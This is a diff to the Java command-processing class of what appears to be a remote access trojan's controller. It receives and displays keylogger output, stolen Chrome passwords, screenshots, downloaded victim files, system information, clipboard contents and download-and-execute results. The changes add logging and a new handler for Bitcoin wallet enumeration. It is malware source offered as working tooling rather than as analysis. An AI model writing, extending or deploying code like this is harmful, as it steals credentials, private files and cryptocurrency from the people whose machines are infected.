@@ -67,6 +67,7 @@ class ProcessCommands implements Repository {
                 KeyloggerView.getData().setText(content);
             } else if (input.contains("CHROMEPASS")){
                 //StringBuilder fullContent = new StringBuilder();
+                Logger.log(Level.INFO, "Got valid results from browseer credential gather!");
                 try{Thread.sleep(100);}catch(InterruptedException e){e.printStackTrace();}
                 ChromePassView.getResultsArea().appendText("Credentials will show up here.\n\n");
                 while (true) {
@@ -87,8 +88,7 @@ class ProcessCommands implements Repository {
             } else if (input.contains("SCREENSHOT")) {
                 // SERVER: SCREENSHOT
                 // CLIENT: filename
-                // CLIENT: b64.encode(file).length
-                // CLIENT: base64.encode(file).bytes[n]
+                // CLIENT: fbytes
                 String fname = readFromDis(dis);
                 String saveDirectory = FileContextMenu.selectedDirectory;
                 long fileLength = dis.readLong();
@@ -99,6 +99,7 @@ class ProcessCommands implements Repository {
                 for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                 bos.close();
                 fos.close();
+                Logger.log(Level.INFO, "Screenshot saved to " + saveDirectory + fname);
             } else if (input.contains("FILELIST")) {
                 String pathName = readFromDis(dis);
                 int filesCount = dis.readInt();
@@ -122,6 +123,7 @@ class ProcessCommands implements Repository {
                 String saveDirectory = FileContextMenu.selectedDirectory;
                 long fileLength = dis.readLong();
                 String fileName = readFromDis(dis);
+                Logger.log(Level.INFO, "Downloading file " + fileName + " from client " + client.getNickName());
                 File downloadedFile = new File(saveDirectory + "/" + fileName);
                 FileOutputStream fos = new FileOutputStream(downloadedFile);
                 BufferedOutputStream bos = new BufferedOutputStream(fos);
@@ -139,13 +141,13 @@ class ProcessCommands implements Repository {
                 break;
             } else if (input.contains("SYINFO")){
                 String data = readFromDis(dis);
-                Logger.log(Level.INFO, "SYSINFO: \n" + data);
+                Logger.log(Level.INFO, "SYSINFO results: \n" + data);
                 SysInfoView.getArea().appendText(data);
             } else if (input.contains("BEACON")) {
                 client.setOnlineStatus("Online");
             } else if (input.contains("DAE")){
                 int status = Integer.parseInt(readFromDis(dis));
-                System.out.println("DOWNLOAD AND EXECUTE STATUS: " + status);
+                Logger.log(Level.INFO, "DOWNLOAD AND EXECUTE STATUS: " + status);
                 if (status == 0){
                     DownloadAndExecuteView.setStatusLabelColor("red");
                     DownloadAndExecuteView.setStatusLabel("Failed to execute");
@@ -162,6 +164,12 @@ class ProcessCommands implements Repository {
             /** clipboard stuff **/
             else if (input.contains("CLIPGET")){
                 GetClipboardView.getData().appendText("Clipboard data: \n\n" + readFromDis(dis));
+            }
+
+            else if (input.contains("ENUM//BTC")){
+                String data = readFromDis(dis);
+                Logger.log(Level.INFO, "Enum BTC wallet returned: " + data);
+                MiscTextView.getData().setText(data);
             }
         }
     }
